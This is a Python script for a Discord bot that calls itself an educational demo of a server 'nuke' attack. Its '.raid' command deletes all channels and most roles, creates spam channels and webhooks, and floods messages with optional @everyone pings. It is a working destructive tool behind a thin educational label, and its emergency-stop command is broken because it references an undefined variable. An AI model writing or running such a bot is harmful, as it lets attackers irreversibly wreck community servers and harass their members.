import discord
from discord.ext import commands
import asyncio
import time

# ========== CONFIGURATION ==========
TOKEN = "YOUR_BOT_TOKEN"
OWNER_ID = 1088143400496279552  # Your Discord ID

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

# Store active demo state
active_demo = {}

@bot.event
async def on_ready():
    print(f"✅ Educational Demo Bot ready - {bot.user}")
    print(f"Owner ID: {OWNER_ID}")
    print(f"Use .raid to start an educational demonstration")

@bot.command(name="raid")
async def demo_raid(ctx, message: str = None, ping: str = None, amount: int = None):
    """
    EDUCATIONAL DEMO - Shows what a nuke bot does
    Usage: .raid [message] [ping:yes/no] [amount]
    Example: .raid "Server Nuked!" yes 50
    """
    
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Only the bot owner can run this educational demo.")
    
    if not ctx.guild.me.guild_permissions.administrator:
        return await ctx.send("❌ Bot needs Administrator permission for this demo. This is why you should NEVER give Admin to untrusted bots!")
    
    # Parse arguments
    if not message:
        message = "⚠️ EDUCATIONAL DEMO - This server has been compromised ⚠️"
    
    ping_enabled = ping and ping.lower() in ['yes', 'y', 'true', '1']
    
    if not amount or amount < 1:
        amount = 10
    elif amount > 100:
        amount = 100  # Cap at 100 for safety (not 100000)
        await ctx.send("⚠️ Amount capped at 100 for educational safety")
    
    guild = ctx.guild
    
    # Educational warning
    embed = discord.Embed(
        title="⚠️ EDUCATIONAL DEMO STARTING ⚠️",
        description="This demonstrates what a malicious nuke bot does.\n"
                   f"**Ping @everyone:** {ping_enabled}\n"
                   f"**Messages per channel:** {amount}\n\n"
                   "Type `.stopraid` immediately to cancel.",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)
    await asyncio.sleep(3)
    
    active_demo[guild.id] = True
    
    try:
        # ========== PHASE 1: Delete all channels ==========
        await ctx.send("📢 **PHASE 1: Deleting all channels...**")
        
        for channel in guild.channels:
            if not active_demo.get(guild.id):
                break
            try:
                await channel.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        await ctx.send("✅ All channels deleted - Attackers wipe your server structure")
        await asyncio.sleep(1)
        
        # ========== PHASE 2: Create spam channels ==========
        await ctx.send("📢 **PHASE 2: Creating spam channels...**")
        
        spam_channels = []
        for i in range(10):
            if not active_demo.get(guild.id):
                break
            try:
                channel = await guild.create_text_channel(f"nuked-{i}")
                spam_channels.append(channel)
                await asyncio.sleep(0.2)
            except:
                pass
        
        await ctx.send(f"✅ Created {len(spam_channels)} spam channels")
        await asyncio.sleep(1)
        
        # ========== PHASE 3: Delete all roles ==========
        await ctx.send("📢 **PHASE 3: Destroying roles...**")
        
        for role in guild.roles:
            if not active_demo.get(guild.id):
                break
            if role.is_default() or role.managed or role == ctx.guild.me.top_role:
                continue
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        await ctx.send("✅ All roles destroyed - Attackers remove moderation capabilities")
        await asyncio.sleep(1)
        
        # ========== PHASE 4: Create webhooks ==========
        await ctx.send("📢 **PHASE 4: Creating webhooks for spam...**")
        
        for channel in spam_channels[:5]:  # Limit to first 5 channels
            if not active_demo.get(guild.id):
                break
            try:
                for i in range(3):
                    await channel.create_webhook(name=f"spammer_{i}")
                    await asyncio.sleep(0.2)
            except:
                pass
        
        await ctx.send("✅ Webhooks created - Attackers use webhooks to bypass rate limits")
        await asyncio.sleep(1)
        
        # ========== PHASE 5: Send spam messages ==========
        await ctx.send(f"📢 **PHASE 5: Sending {amount} messages per channel with ping={ping_enabled}...**")
        
        for channel in spam_channels:
            if not active_demo.get(guild.id):
                break
            
            ping_text = "@everyone " if ping_enabled else ""
            
            for i in range(min(amount, 100)):  # Cap at 100 for safety
                if not active_demo.get(guild.id):
                    break
                try:
                    await channel.send(f"{ping_text}{message} [{i+1}/{amount}]")
                    await asyncio.sleep(0.3)
                except:
                    pass
        
        await ctx.send("✅ Spam messages sent - Attackers flood your server")
        await asyncio.sleep(1)
        
        # ========== Educational Summary ==========
        embed = discord.Embed(
            title="⚠️ EDUCATIONAL DEMO COMPLETE ⚠️",
            description="**What you just witnessed:**\n"
                       "1. 🔥 Channel Deletion - All channels wiped\n"
                       "2. 📁 Spam Channels - Malicious channels created\n"
                       "3. 👑 Role Destruction - Admin/Mod roles removed\n"
                       "4. 🕸️ Webhook Abuse - Bypassed rate limits\n"
                       f"5. 💬 Mass Pinging - {amount} messages with {'@everyone' if ping_enabled else 'no pings'}\n\n"
                       "**How to PROTECT your server:**\n"
                       "• ✅ NEVER give Administrator to untrusted bots\n"
                       "• ✅ Use 2FA on administrator accounts\n"
                       "• ✅ Enable invite moderation and verification levels\n"
                       "• ✅ Use backup bots to save server structure\n"
                       "• ✅ Audit your server's bot list regularly\n\n"
                       f"**This demo will end in 30 seconds...**",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        
        await asyncio.sleep(30)
        
    except Exception as e:
        await ctx.send(f"❌ Demo error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.command(name="stopraid")
async def stop_demo(ctx):
    """Emergency stop for the educational demo"""
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Only the bot owner can stop the demo.")
    
    if ctx.guild.id in active_demo:
        active_demo[guild.id] = False
        await ctx.send("🛑 **Educational demo stopped by owner**")
    else:
        await ctx.send("No active demo running.")

@bot.command(name="protect")
async def protection_info(ctx):
    """Educational info about server protection"""
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server from Nuke Bots",
        description="Educational guide for server safety",
        color=discord.Color.green()
    )
    embed.add_field(name="1. Bot Permissions", 
                    value="**NEVER give Administrator** to untrusted bots. Review permissions before inviting.", 
                    inline=False)
    embed.add_field(name="2. Role Hierarchy", 
                    value="Keep your highest role secure. Only trusted members should have Admin.", 
                    inline=False)
    embed.add_field(name="3. 2-Factor Authentication", 
                    value="Enable 2FA on all administrator accounts to prevent account takeover.", 
                    inline=False)
    embed.add_field(name="4. Server Verification", 
                    value="Set Verification Level to 'High' to prevent raids from new accounts.", 
                    inline=False)
    embed.add_field(name="5. Backup Bots", 
                    value="Use legitimate backup bots (like Xenon) to save your server structure.", 
                    inline=False)
    embed.add_field(name="6. Audit Logs", 
                    value="Regularly check Audit Logs for suspicious activity like mass channel creation.", 
                    inline=False)
    embed.set_footer(text="Educational purposes only - Stay safe!")
    
    await ctx.send(embed=embed)

@bot.command(name="commands")
async def list_commands(ctx):
    """Show available commands"""
    embed = discord.Embed(
        title="Educational Demo Bot Commands",
        description="These commands are for educational demonstration only",
        color=discord.Color.blue()
    )
    embed.add_field(name=".raid [message] [ping:yes/no] [amount]", 
                    value="Start educational nuke demonstration\n"
                          "Example: `.raid \"Server Nuked!\" yes 50`", 
                    inline=False)
    embed.add_field(name=".stopraid", 
                    value="Emergency stop the active demonstration", 
                    inline=False)
    embed.add_field(name=".protect", 
                    value="Show server protection guide", 
                    inline=False)
    embed.add_field(name=".commands", 
                    value="Show this help message", 
                    inline=False)
    embed.set_footer(text="⚠️ Educational purposes only - Run only on test servers")
    
    await ctx.send(embed=embed)

bot.run(TOKEN)
